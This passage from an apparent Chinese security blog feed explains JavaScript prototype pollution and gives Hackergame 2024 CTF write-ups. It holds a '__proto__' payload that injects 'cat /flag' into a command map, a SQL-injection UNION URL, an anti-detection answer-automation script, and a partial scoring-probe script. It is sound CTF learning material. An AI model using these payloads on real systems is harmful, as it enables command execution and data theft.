title="原型链污染"></a>原型链污染</h2><p>如果修改了一个对象的原型，那么会影响所有来自于这个原型的对象，这就是原型链污染。</p><p>举例：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 假设我们有一个简单的用户输入处理函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">pollute</span>(<span class="hljs-params">target, key, value</span>) &#123;<br>  target[key] = value; <span class="hljs-comment">// 修改目标对象</span><br>&#125;<br><br><span class="hljs-comment">// 用户输入的对象</span><br>const userInput = &#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// 修改了 Object.prototype 的属性</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 调用函数，污染原型链</span><br>pollute(&#123;&#125;, userInput.__proto__, &#123;&#125;);<br><br><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(&#123;&#125;.isAdmin); <span class="hljs-comment">// 输出: true</span><br></code></pre></td></tr></table></figure><p>在上面的例子中，<code>pollute</code> 函数将用户输入的原型链中的 <code>isAdmin</code> 属性添加到 <code>Object.prototype</code> 上，从而使得所有对象都具有 <code>isAdmin</code> 属性。</p><p>原型链污染通常出现在对象的<strong>键名(属性名)可控</strong>，同时这些键名的值是通过赋值语句进行设置的情况下 ( 通常使用 json 传值 )。</p><h1 id="0x01-实战：Hackergame-2024-Node-js-is-Web-Scale"><a href="#0x01-实战：Hackergame-2024-Node-js-is-Web-Scale" class="headerlink" title="0x01 实战：Hackergame 2024- Node.js is Web Scale"></a>0x01 实战：Hackergame 2024- Node.js is Web Scale</h1><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p><img src="/../images/Pasted%20image%2020241105175836.png"></p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// server.js</span><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> &#123; execSync &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;public&quot;</span>)));<br><br><span class="hljs-keyword">let</span> cmds = &#123;<br>  <span class="hljs-attr">getsource</span>: <span class="hljs-string">&quot;cat server.js&quot;</span>,<br>  <span class="hljs-attr">test</span>: <span class="hljs-string">&quot;echo &#x27;hello, world!&#x27;&quot;</span>,<br>&#125;;<br><br><span class="hljs-keyword">let</span> store = &#123;&#125;;<br><br><span class="hljs-comment">// GET /api/store - Retrieve the current KV store</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/api/store&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">json</span>(store);<br>&#125;);<br><br><span class="hljs-comment">// POST /set - Set a key-value pair in the store</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/set&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> &#123; key, value &#125; = req.<span class="hljs-property">body</span>;<br><br>  <span class="hljs-keyword">const</span> keys = key.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;.&quot;</span>);<br>  <span class="hljs-keyword">let</span> current = store;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; keys.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">const</span> key = keys[i];<br>    <span class="hljs-keyword">if</span> (!current[key]) &#123;<br>      current[key] = &#123;&#125;;<br>    &#125;<br>    current = current[key];<br>  &#125;<br><br>  <span class="hljs-comment">// Set the value at the last key</span><br>  current[keys[keys.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]] = value;<br><br>  res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;OK&quot;</span> &#125;);<br>&#125;);<br><br><span class="hljs-comment">// GET /get - Get a key-value pair in the store</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/get&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> key = req.<span class="hljs-property">query</span>.<span class="hljs-property">key</span>;<br>  <span class="hljs-keyword">const</span> keys = key.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br>  <span class="hljs-keyword">let</span> current = store;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; keys.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">const</span> key = keys[i];<br>    <span class="hljs-keyword">if</span> (current[key] === <span class="hljs-literal">undefined</span>) &#123;<br>      res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;Not exists.&quot;</span> &#125;);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    current = current[key];<br>  &#125;<br><br>  res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: current &#125;);<br>&#125;);<br><br><span class="hljs-comment">// GET /execute - Run commands which are constant and obviously safe.</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/execute&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> key = req.<span class="hljs-property">query</span>.<span class="hljs-property">cmd</span>;<br>  <span class="hljs-keyword">const</span> cmd = cmds[key];<br>  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;content-type&quot;</span>, <span class="hljs-string">&quot;text/plain&quot;</span>);<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">execSync</span>(cmd).<span class="hljs-title function_">toString</span>());<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;public&quot;</span>, <span class="hljs-string">&quot;index.html&quot;</span>));<br>&#125;);<br><br><span class="hljs-comment">// Start the server</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = <span class="hljs-number">3000</span>;<br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`KV Service is running on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>以上代码是一个 Node.js 应用，提供了基本的 <strong>Key-Value 存储</strong> 功能，并且允许执行预定义的安全命令。</p><p>关键路由分析：</p><ol><li><strong>GET &#x2F;api&#x2F;store</strong>：返回当前的键值对存储。</li><li><strong>POST &#x2F;set</strong>：允许用户设置键值对，键以点（<code>.</code>）分隔，可以创建多层嵌套的键。</li><li><strong>GET &#x2F;get</strong>：通过查询参数获取指定键的值。</li><li><strong>GET &#x2F;execute</strong>：通过查询参数执行预定义的命令，如 <code>getsource</code> 和 <code>test</code>。</li></ol><p>在代码中，<code>/set</code> 路由允许用户提供一个键值对，将值嵌套存储在 <code>store</code> 对象中。我们可以尝试使用 <code>__proto__</code> 作为键，污染对象的原型链。通过设置 <code>cmds</code> 对象的 <code>__proto__</code> 属性，可能让 <code>cmds</code> 对象获取额外的指令，允许执行任意命令，比如 <code>cat /flag</code>。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li><strong>利用 <code>/set</code> 路由进行原型链污染</strong></li></ol><p>如果向 <code>/set</code> 路由提交 <code>&#123;&quot;key&quot;: &quot;exploit&quot;, &quot;value&quot;: &quot;cat /flag&quot;&#125;</code>，这个键值对仅仅会保存在 <code>store</code> 对象中，而不会对 <code>cmds</code> 对象产生任何影响。</p><p>为了成功执行未定义的命令，尝试通过原型链污染的方式向 <code>cmds</code> 添加新属性。：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;__proto__.exploit&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cat /flag&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241105190445.png"></p><p>这会将 <code>exploit</code> 命令挂载到 <code>cmds</code> 对象的原型链上，使得 <code>cmds.exploit</code> 实际上等于 <code>cat /flag</code>。</p><ol start="2"><li><strong>通过 <code>/execute</code> 路由触发执行命令</strong></li></ol><ul><li><p><code>const key = req.query.cmd;</code> 这行代码从请求的查询字符串中提取出名为 <code>cmd</code> 的参数。用户在访问 <code>/execute</code> 时，可以通过 <code>?cmd=xxx</code> 形式传递这个参数。</p></li><li><p><code>const cmd = cmds[key];</code> 这行代码根据提取的 <code>key</code> 从 <code>cmds</code> 对象中获取对应的命令。</p></li></ul><p><strong>请求 URL</strong>: <code>/execute?cmd=exploit</code><br><img src="/../images/Pasted%20image%2020241105193616.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前置知识&quot;&gt;&lt;a href=&quot;#0x00-前置知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 前置知识&quot;&gt;&lt;/a&gt;0x00 前置知识&lt;/h1&gt;&lt;h2 id=&quot;继承与原型链&quot;&gt;&lt;a href=&quot;#继承与原型链&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Hackergame-2024-Web</title>
    <link href="http://example.com/2024/11/03/Hackergame-2024-Web/"/>
    <id>http://example.com/2024/11/03/Hackergame-2024-Web/</id>
    <published>2024-11-03T04:11:18.000Z</published>
    <updated>2024-12-09T08:33:25.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="/../images/Pasted%20image%2020241103121215.png"><br><img src="/../images/Pasted%20image%2020241103124000.png"></p><h1 id="PaoluGPT"><a href="#PaoluGPT" class="headerlink" title="PaoluGPT"></a>PaoluGPT</h1><p>下载源码，包含database.py和main.py。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># database.py</span><br><br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_query</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span>, fetch_all: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span></span>):<br>    conn = sqlite3.connect(<span class="hljs-string">&quot;file:/tmp/data.db?mode=ro&quot;</span>, uri=<span class="hljs-literal">True</span>)<br>    cur = conn.cursor()<br>    res = cur.execute(s)<br>    <span class="hljs-keyword">if</span> fetch_all:<br>        <span class="hljs-keyword">return</span> res.fetchall()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> res.fetchone()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># main.py的关键代码</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/list&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list</span>():<br>    results = execute_query(<span class="hljs-string">&quot;select id, title from messages where shown = true&quot;</span>, fetch_all=<span class="hljs-literal">True</span>)<br>    messages = [Message(m[<span class="hljs-number">0</span>], m[<span class="hljs-number">1</span>], <span class="hljs-literal">None</span>) <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> results]<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;list.html&quot;</span>, messages=messages)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/view&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    conversation_id = request.args.get(<span class="hljs-string">&quot;conversation_id&quot;</span>)<br>    results = execute_query(<span class="hljs-string">f&quot;select title, contents from messages where id = &#x27;<span class="hljs-subst">&#123;conversation_id&#125;</span>&#x27;&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;view.html&quot;</span>, message=Message(<span class="hljs-literal">None</span>, results[<span class="hljs-number">0</span>], results[<span class="hljs-number">1</span>]))<br></code></pre></td></tr></table></figure><p>分析以上代码，发现</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">title</span>, contents <span class="hljs-keyword">from</span> messages <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;&#123;conversation_id&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>直接将<code>conversation_id</code> 插入到查询中，没有经过参数化或转义，这是一个明显的SQL 注入漏洞。</p><p>闭合方式是单引号，构造<code>https://chal01-acbmue75.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=1&#39; OR &#39;1&#39;=&#39;1</code>，理论上会返回所有行，但是只返回了一条数据。</p><p>阅读源码，发现<code>execute_query</code> 使用了 <code>cur.fetchone()</code>，默认返回第一行结果。想到利用<code>group_concat</code>。</p><p>查询语句的列数是2，所以构造</p><figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">https://chal01-acbmue75.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=1&#x27; UNION <span class="hljs-keyword">SELECT</span> GROUP_CONCAT(contents, <span class="hljs-string">&#x27;;&#x27;</span>), <span class="hljs-literal">NULL</span> <span class="hljs-keyword">FROM</span> messages--<br></code></pre></td></tr></table></figure><p>注意：<code>#</code> 是 MySQL 的特有注释方式，在其他数据库系统（如 SQLite）中不被支持。<br>在 SQL 注入时，建议使用 <code>--</code>，因为它是一个更通用的注释符号，确保在各种数据库中都能正确工作。</p><p>在结果中搜索flag关键词。</p><p><img src="/../images/Pasted%20image%2020241103155909.png"></p><h1 id="喜欢做签到的-CTFer-你们好呀"><a href="#喜欢做签到的-CTFer-你们好呀" class="headerlink" title="喜欢做签到的 CTFer 你们好呀"></a>喜欢做签到的 CTFer 你们好呀</h1><p><img src="/../images/Pasted%20image%2020241103163940.png"><br><img src="/../images/Pasted%20image%2020241105140601.png"></p><h1 id="比大小王"><a href="#比大小王" class="headerlink" title="比大小王"></a>比大小王</h1><p><img src="/../images/Pasted%20image%2020241105211516.png"></p><figure class="highlight pf"><table><tr><td class="code"><pre><code class="hljs pf">(function fastAutomateGame() &#123;<br>  // 快速答题的主函数<br>  function autoChooseAnswer() &#123;<br>    if (<span class="hljs-keyword">state</span>.score1 <span class="hljs-variable">&lt; 100) &#123;</span><br><span class="hljs-variable">      // 计算出正确答案并立即选择</span><br><span class="hljs-variable">      const choice = state.value1 &lt; state.value2 ? &#x27;&lt;&#x27; : &#x27;&gt;</span>&#x27;;<br>      <span class="hljs-keyword">state</span>.inputs.push(choice); // 更新输入列表<br>      <span class="hljs-keyword">state</span>.score1++; // 累加分数<br><br>      // 更新页面显示<br>      document.getElementById(&#x27;score1&#x27;).textContent = <span class="hljs-keyword">state</span>.score1;<br>      document.getElementById(&#x27;progress1&#x27;).style.width = `$&#123;<span class="hljs-keyword">state</span>.score1&#125;%`; // 更新进度条<br><br>      // 判断是否已经达到<span class="hljs-number">100</span>分<br>      if (<span class="hljs-keyword">state</span>.score1 === <span class="hljs-number">100</span>) &#123;<br>        // 调用submit函数自动提交<br>        submit(<span class="hljs-keyword">state</span>.inputs);<br>        console.<span class="hljs-keyword">log</span>(<span class="hljs-string">&quot;达到 100 分，自动提交答案！&quot;</span>);<br>      &#125; else &#123;<br>        // 否则更新下一个值并继续快速答题<br>        <span class="hljs-keyword">state</span>.value1 = <span class="hljs-keyword">state</span>.values[<span class="hljs-keyword">state</span>.score1][<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">state</span>.value2 = <span class="hljs-keyword">state</span>.values[<span class="hljs-keyword">state</span>.score1][<span class="hljs-number">1</span>];<br>        document.getElementById(&#x27;value1&#x27;).textContent = <span class="hljs-keyword">state</span>.value1;<br>        document.getElementById(&#x27;value2&#x27;).textContent = <span class="hljs-keyword">state</span>.value2;<br><br>        // 立即递归调用继续答题<br>        <span class="hljs-keyword">const</span> <span class="hljs-keyword">random</span>Delay = Math.floor(Math.<span class="hljs-keyword">random</span>() * <span class="hljs-number">100</span>) + <span class="hljs-number">50</span>; // <span class="hljs-number">50</span>到<span class="hljs-number">150</span>毫秒<br>        <span class="hljs-built_in">set</span>Timeout(autoChooseAnswer, <span class="hljs-keyword">random</span>Delay);<br>      &#125;<br>    &#125;<br>  &#125;<br><br>  console.<span class="hljs-keyword">log</span>(<span class="hljs-string">&quot;快速自动游戏开始...&quot;</span>);<br>  autoChooseAnswer();<br>&#125;)();<br></code></pre></td></tr></table></figure><p><strong>小结</strong>：</p><ol><li><p>自执行匿名函数（IIFE）：</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><code class="hljs actionscript">(<span class="hljs-keyword">function</span> <span class="hljs-title function_">fastAutomateGame</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-comment">// 函数体</span><br>&#125;)();<br></code></pre></td></tr></table></figure><p>在 IIFE 中使用括号的原因是为了将函数声明转换为函数表达式，从而能够立即调用它。</p></li><li><p><code>submit</code> 函数发送一个包含 <code>inputs</code> 的 POST 请求到服务器的 <code>/submit</code> 路径，并将玩家的所有输入（<code>inputs</code> 数组）作为数据发送。返回的数据（<code>data.message</code>）会显示在页面的 <code>dialog</code> 元素中，可能包含有关结果的信息，比如“成功”或“失败”的消息。如果服务器返回的消息中包含 <code>flag</code>，可以在这里查看到。</p></li><li><p>由于键盘和鼠标事件触发 <code>chooseAnswer</code> 函数来更新输入，如果可以通过脚本触发这些事件，就可以快速累积到 <code>100</code> 分，并触发 <code>submit</code> 函数。</p></li><li><p>游戏中有防止“快速答题”的机制，检测到我们修改了状态或超速完成操作。为了避免被识别为“时空穿越”，增加一个稍短的间隔（例如，50到150毫秒的随机延时）来模拟真实答题。<br><img src="/../images/ec948a9a2132e502da831b8bb8b2331.png"></p></li><li><p><code>state.allowInput</code> 变量用于控制用户是否可以输入答案。在正常情况下，游戏逻辑中会在倒计时结束后将其设置为 <code>true</code>，以允许用户输入。但是，在这段自动化代码中，输入的选择是直接计算出来的，没有实际的用户输入行为，因此即使在倒计时期间也能够执行。</p></li></ol><h1 id="Node-js-is-Web-Scale"><a href="#Node-js-is-Web-Scale" class="headerlink" title="Node.js is Web Scale"></a>Node.js is Web Scale</h1><p><a href="https://xsh.asia/2024/11/05/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染 |</a><br><img src="/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.md" alt="Node.js原型链污染"></p><h1 id="禁止内卷"><a href="#禁止内卷" class="headerlink" title="禁止内卷"></a>禁止内卷</h1><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, flash, redirect<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> traceback<br><span class="hljs-keyword">import</span> secrets<br><br>app = Flask(__name__)<br>app.secret_key = secrets.token_urlsafe(<span class="hljs-number">64</span>)<br><br>UPLOAD_DIR = <span class="hljs-string">&quot;/tmp/uploads&quot;</span><br><br>os.makedirs(UPLOAD_DIR, exist_ok=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment"># results is a list</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        results = json.load(f)<br>        <span class="hljs-comment"># 读取文件并解析为 JSON 格式</span><br><span class="hljs-keyword">except</span> FileNotFoundError:<br>    results = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(results, f)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_answer</span>():<br>    <span class="hljs-comment"># scoring with answer</span><br>    <span class="hljs-comment"># I could change answers anytime so let&#x27;s just load it every time</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;answers.json&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        answers = json.load(f)<br>        <span class="hljs-comment"># sanitize answer</span><br>        <span class="hljs-keyword">for</span> idx, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span>:<br>                answers[idx] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> answers<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, results=<span class="hljs-built_in">sorted</span>(results))<br>    <span class="hljs-comment"># 注意这个排序</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/submit&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files <span class="hljs-keyword">or</span> request.files[<span class="hljs-string">&#x27;file&#x27;</span>].filename == <span class="hljs-string">&quot;&quot;</span>:<br>        flash(<span class="hljs-string">&quot;你忘了上传文件&quot;</span>)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    filename = file.filename<br>    filepath = os.path.join(UPLOAD_DIR, filename)<br>    file.save(filepath)<br><br>    answers = get_answer()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath) <span class="hljs-keyword">as</span> f:<br>            user = json.load(f)<br>    <span class="hljs-keyword">except</span> json.decoder.JSONDecodeError:<br>        flash(<span class="hljs-string">&quot;你提交的好像不是 JSON&quot;</span>)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        score = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> idx, i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(answers):<br>            score += (i - user[idx]) * (i - user[idx])<br>            <span class="hljs-comment"># 平方差的总和</span><br>    <span class="hljs-keyword">except</span>:<br>        flash(<span class="hljs-string">&quot;分数计算出现错误&quot;</span>)<br>        traceback.print_exc()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-comment"># ok, update results</span><br>    results.append(score)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;results.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        json.dump(results, f)<br>    flash(<span class="hljs-string">f&quot;评测成功，你的平方差为 <span class="hljs-subst">&#123;score&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p>仔细阅读后端代码，后端接收到上传的文件后，首先会检查文件是否存在，然后将文件保存到 <code>/tmp/uploads</code> 目录。后端会尝试将上传的文件读取并解析为 JSON 格式。然后，它将与预设的 <code>answers.json</code> 进行比较。通过计算上传的文件中的数字与 <code>answers.json</code> 中的数字之间的平方差得到评分。</p><p>如果提交的 JSON 列表每一项都是 0，那么评分的结果将等于 <code>answers</code> 列表所有元素的平方和。通过更改第一个元素猜测<code>answers</code> 列表的第一个元素：如果是37，那么两次结果的差应是37的平方。</p><blockquote><p>[!NOTE]<br>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式。它通常用于传输数据，特别是在 Web 应用程序中。JSON 格式的数据结构由以下几部分组成：</p><ul><li>对象（Object）：由花括号 <code>&#123;&#125;</code> 包裹的键值对集合，键必须是字符串，值可以是多种类型。</li><li>数组（Array）：由方括号 <code>[]</code> 包裹的值的集合，值可以是任何类型。</li><li>字符串（String）：被双引号 <code>&quot;</code> 包裹的文本。</li><li>数字（Number）、布尔值（Boolean）、null：JSON 也支持这些原始数据类型。<br>在 JSON 格式中，数据本质上是以<strong>字符串</strong>的形式传输的。</li></ul></blockquote><p><img src="/../images/Pasted%20image%2020241108140943.png"></p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">data</span>):<br>    url = <span class="hljs-string">&#x27;https://chal02-vfyz4byt.hack-challenge.lug.ustc.edu.cn:8443/submit&#x27;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;user-agent&#x27;</span> : <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 后端：file = request.files[&#x27;file&#x27;]</span><br>    files = &#123;<br>        <span class="hljs-string">&#x27;file&#x27;</span> : (<span class="hljs-string">&#x27;test&#x27;</span>, data, <span class="hljs-string">&#x27;application/json&#x27;</span>)<br>    &#125;<br>    response = requests.post(url, headers=headers, files=files)<br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>        soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        <span class="hljs-built_in">list</span> = soup.find_all(<span class="hljs-string">&#x27;li&#x27;</span>, class_ = <span class="hljs-string">&#x27;list-group-item&#x27;</span>) <span class="hljs-comment"># class_ 是 class 的替代写法，因为 class 是 Python 的保留字。</span><br>        <span class="hljs-comment"># find_all() 方法返回一个包含所有匹配结果的列表</span><br>        scores=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>            score = i.get_text().split(<span class="hljs-string">&#x27;：&#x27;</span>)[<span class="hljs-number">1</span>].strip()<br>            <span class="hljs-comment"># 提取出 ：后面的数字部分，并去除任何多余的空格或换行符</span><br>            scores.append(score)<br>        <span class="hljs-keyword">return</span> scores<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Request failed with status code: <span class="hljs-subst">&#123;response.status_code&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_new_score</span>(<span class="hljs-params">a1, a2</span>):<br>    count1 = Counter(a1)<br>    count2 = Counter(a2)<br>    <span class="hljs-comment"># 找到在arr2中多出来的元素</span><br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count2:<br>        <span class="hljs-keyword">if</span> count2[num] != count1.get(num,<span class="hljs-number">0</span>):<br>            <span class="hljs-comment"># 如果 num 元素在 count2 中的出现次数与在 count1 中的出现次数不相等,则返回num</span><br>            <span class="hljs-comment"># 如果 num 不在 count1 中，则返回 0</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(num) <span class="hljs-comment"># score是字符串</span><br>            <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scores1 = send(<span class="hljs-built_in">str</span>([<span class="hljs-number">0</span>]*<span class="hljs-number">500</span>))<br>    scores2 = send(<span class="hljs-built_in">str</span>([<span class="hljs-number">0</span>]*<span class="hljs-number">500</span>))<br>    all_zero_score = find_new_score(scores1, scores2)<br>    <span 